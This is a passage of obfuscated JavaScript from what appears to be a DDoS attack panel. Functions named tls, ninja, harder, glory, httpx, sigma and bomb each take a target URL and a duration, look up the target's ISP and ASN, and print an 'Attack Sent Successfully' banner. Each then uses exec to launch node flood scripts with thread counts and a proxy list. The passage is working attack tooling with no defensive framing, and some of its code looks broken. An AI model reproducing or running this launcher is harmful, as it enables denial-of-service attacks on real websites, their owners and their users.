    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x5a311c + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x6aae + " [1;37m]\n[1;37m      Methods:    [[1m[36m flood [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x471d4a.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x471d4a.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x471d4a.query + " [1;37m]\n");
  } catch (_0x3fa377) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x301186 = path.join(__dirname, "/lib/cache/2");
  exec("node " + _0x301186 + " " + _0x5a311c + " " + _0x6aae + " 64 10 proxy.txt");
  sigma();
}
;
async function tls(_0x881b23) {
  if (_0x881b23.length < 0x3) {
    console.log("Example: .tls <target> <port> <duration>\ntls https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x5206ce, _0x511a22, _0x5b704b] = _0x881b23;
  try {
    const _0x2eea97 = new url.URL(_0x5206ce);
    const _0x22c351 = _0x2eea97.hostname;
    const _0x219f22 = await axios.get("http://ip-api.com/json/" + _0x22c351 + "?fields=isp,query,as");
    const _0x2a2f9f = _0x219f22.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x5206ce + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x5b704b + " [1;37m]\n[1;37m      Methods:    [[1m[36m tls [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x2a2f9f.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x2a2f9f.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x2a2f9f.query + " [1;37m]\n");
  } catch (_0x1e6b4e) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x1925e9 = path.join(__dirname, '/lib/cache/3');
  exec("node " + _0x1925e9 + " " + _0x5206ce + " " + _0x5b704b + " 100 10");
  sigma();
}
;
async function ninja(_0x17e07d) {
  if (_0x17e07d.length < 0x3) {
    console.log("Example: .ninja <target> <port>  <duration>\nninja https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x2cd6ab, _0x4cd05a, _0xb87f51] = _0x17e07d;
  try {
    const _0x4200b0 = new url.URL(_0x2cd6ab);
    const _0x1fb456 = _0x4200b0.hostname;
    const _0x901a2a = await axios.get("http://ip-api.com/json/" + _0x1fb456 + "?fields=isp,query,as");
    const _0x38e5d2 = _0x901a2a.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x2cd6ab + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0xb87f51 + " [1;37m]\n[1;37m      Methods:    [[1m[36m ninja [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x38e5d2.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x38e5d2.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x38e5d2.query + " [1;37m]\n");
  } catch (_0x5509ce) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x22d6fd = path.join(__dirname, "/lib/cache/1");
  exec("node " + _0x22d6fd + " " + _0x2cd6ab + " " + _0xb87f51);
  sigma();
}
;
async function harder(_0x5f14b8) {
  if (_0x5f14b8.length < 0x3) {
    console.log("Example: .harder <target> <port>  <duration>\nharder https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x384075, _0x3dc558, _0x2af74f] = _0x5f14b8;
  try {
    const _0xaf77f = new url.URL(_0x384075);
    const _0x5b0abe = _0xaf77f.hostname;
    const _0x97d385 = await axios.get("http://ip-api.com/json/" + _0x5b0abe + "?fields=isp,query,as");
    const _0x3b8396 = _0x97d385.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x384075 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x2af74f + " [1;37m]\n[1;37m      Methods:    [[1m[36m harder [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x3b8396.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x3b8396.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x3b8396.query + " [1;37m]\n");
  } catch (_0x5f04ec) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x427bd3 = path.join(__dirname, "/lib/cache/4");
  exec("node " + _0x427bd3 + " " + _0x384075 + " " + _0x2af74f + " 32 10 proxy.txt");
  sigma();
}
;
async function glory(_0x4ff056) {
  if (_0x4ff056.length < 0x3) {
    console.log("Example: .glory <target> <port>  <duration>\nglory https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0xc98aed, _0x17f00e, _0x1442db] = _0x4ff056;
  try {
    const _0x3fd225 = new url.URL(_0xc98aed);
    const _0x129a26 = _0x3fd225.hostname;
    const _0x4a22d4 = await axios.get("http://ip-api.com/json/" + _0x129a26 + "?fields=isp,query,as");
    const _0x3db15e = _0x4a22d4.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0xc98aed + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x1442db + " [1;37m]\n[1;37m      Methods:    [[1m[36m glory [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x3db15e.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x3db15e.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x3db15e.query + " [1;37m]\n");
  } catch (_0x192348) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x4946bf = path.join(__dirname, "/lib/cache/5");
  exec("node " + _0x4946bf + " " + _0xc98aed + " " + _0x1442db + " 32 8 proxy.txt");
  sigma();
}
;
async function httpx(_0x11c796) {
  if (_0x11c796.length < 0x3) {
    console.log("Example: .httpx <target> <port>  <duration>\nhttpx https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0xd2aa11, _0x4c7e43, _0x1bc106] = _0x11c796;
  try {
    const _0x4f57de = new url.URL(_0xd2aa11);
    const _0x19f1b1 = _0x4f57de.hostname;
    const _0x4d89b6 = await axios.get("http://ip-api.com/json/" + _0x19f1b1 + "?fields=isp,query,as");
    const _0x57db9c = _0x4d89b6.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0xd2aa11 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x1bc106 + " [1;37m]\n[1;37m      Methods:    [[1m[36m httpx [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x57db9c.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x57db9c.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x57db9c.query + " [1;37m]\n");
  } catch (_0x54bbbb) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x2174de = path.join(__dirname, '/lib/cache/6');
  exec("node " + _0x2174de + " " + _0xd2aa11 + " " + _0x1bc106 + " 9 3 proxy.txt");
  sigma();
}
;
async function sigma(_0x2608fc) {
  if (_0x2608fc.length < 0x3) {
    console.log("Example: .sigma <target> <port>  <duration>\nsigma https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x502f6b, _0x165595, _0x3d5af3] = _0x2608fc;
  try {
    const _0x13ced0 = new url.URL(_0x502f6b);
    const _0x522320 = _0x13ced0.hostname;
    const _0x37b2b3 = await axios.get('http://ip-api.com/json/' + _0x522320 + "?fields=isp,query,as");
    const _0xf49a8c = _0x37b2b3.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x502f6b + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x3d5af3 + " [1;37m]\n[1;37m      Methods:    [[1m[36m sigma [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0xf49a8c.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0xf49a8c.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0xf49a8c.query + " [1;37m]\n");
  } catch (_0x129093) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x487ab7 = path.join(__dirname, '/lib/cache/7');
  exec("node " + _0x487ab7 + " " + _0x502f6b + " " + _0x3d5af3 + " 32 10 proxy.txt");
  sigma();
}
;
async function bomb(_0x178c37) {
  if (_0x178c37.length < 0x3) {
    console.log("Example: .bomb <target> <port>  <duration>\nbomb https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x5e8411, _0x45e743, _0x588f04] = _0x178c37;
  try {
    const _0x2fbc21 = new url.URL(_0x5e8411);
    const _0x8e683c = _0x2fbc21.hostname;
    const _0x4ad420 = await axios.get("http://ip-api.com/json/" + _0x8e683c + "?fields=isp,query,as");
    const _0x15e41b = _0x4ad420.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x5e8411 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x588f04 + " [1;37m]\n[1;37m      Methods:    [[1m[36m bomb [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x15e41b.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x15e41b.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x15e41b.query + " [1;37m]\n\n");
  } catch (_0x13a573) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x269ed7 = path.join(__dirname, "/lib/cache/8");
  exec("node " + _0x269ed7 + " " + _0x5e8411 + " " + _0x588f04 + " 64 10 proxy.txt");
  sigma();
}
;
async function bypass(_0x1dd767) {
  if (_0x1dd767.length < 0x3) {
    console.log("Example: .bypass <target> <port>  <duration>\nbypass https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x519f81, _0x4d403b, _0x2689d6] = _0x1dd767;
  try {
    const _0x3b8ebe = new url.URL(_0x519f81);
    const _0x237a59 = _0x3b8ebe.hostname;
    const _0x17efdc = await axios.get("http://ip-api.com/json/" + _0x237a59 + '?fields=isp,query,as');
    const _0x5279b6 = _0x17efdc.data;
    console.clear();
